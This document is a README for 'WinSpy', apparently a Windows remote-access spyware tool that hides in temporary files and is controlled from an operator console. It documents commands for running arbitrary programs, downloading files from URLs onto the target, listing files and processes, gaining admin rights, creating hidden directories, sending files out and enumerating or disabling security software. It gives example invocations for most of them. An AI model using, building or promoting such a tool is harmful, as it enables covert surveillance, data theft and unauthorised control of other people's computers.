# WinSpy

A spy program that automatically places itself in temporary files and spies on you, remotely controlled by WinSpyConsole which allows the execution of programs and the execution of many commands.

## WinSpyConsole

* start
    * start the server
* stop
    * stop the server
* exit
    * stop and close console

> Commands

```
$ <action> <arg>
```

> Action

* CMD
    * args required for command
    ```cmd
    $ cmd start chrome
    ```
* ADMIN
    * get admin 
* EXECUTE
    * args required for program + program argv
     ```cmd
    $ execute cmd.exe /c start http://example.com/
    ```
* DOWNLOAD
    * args required for file name + url
     ```cmd
    $ download example.html http://example.com/
    ```
* FILE_LIST
    * arg required for path
    ```cmd
    $ file_list C:\
    ```
* PROCESS_LIST
    ```cmd
    $ process_list
    ```
* SECURITY_LIST
    * not work very well
    ```cmd
    $ security_list
    ```
* SECURITY_DISABLE
    * not implemented
* CREATE_FILE
    * arg required
    ```cmd
    $ create_file hello.txt
    ```
* CREATE_DIR
    * args required directory + hidden (1 or 0)
    ```cmd 
    create_dir C:\Hello 1 
    ```
* GET_PATH
    * arg required windows directory (value)
        * CSIDL_ADMINTOOLS
        * CSIDL_APPDATA
        * CSIDL_COMMON_ADMINTOOLS
        * CSIDL_COMMON_APPDATA
        * CSIDL_COMMON_DOCUMENTS
        * CSIDL_COOKIES
        * CSIDL_FLAG_CREATE
        * CSIDL_FLAG_DONT_VERIFY
        * CSIDL_HISTORY
        * CSIDL_INTERNET_CACHE
        * CSIDL_LOCAL_APPDATA
        * CSIDL_MYPICTURES
        * CSIDL_PERSONAL
        * CSIDL_PROGRAM_FILES
        * CSIDL_PROGRAM_FILES_COMMON
        * CSIDL_SYSTEM
        * CSIDL_WINDOWS
        * ...
        * [list values here](https://tarma.com/support/im9/using/symbols/functions/csidls.htm)
    * 37 = CSIDL_SYSTEM
    ```cmd 
    get_path 37
    ```
* SEND
    * arg required file name + path
    ```cmd 
    send hello.txt %userprofile%\AppData\Local\Temp
    ```
* NONE
    * test command 
    ```cmd 
    $ none ping
    ```

## WinSPy
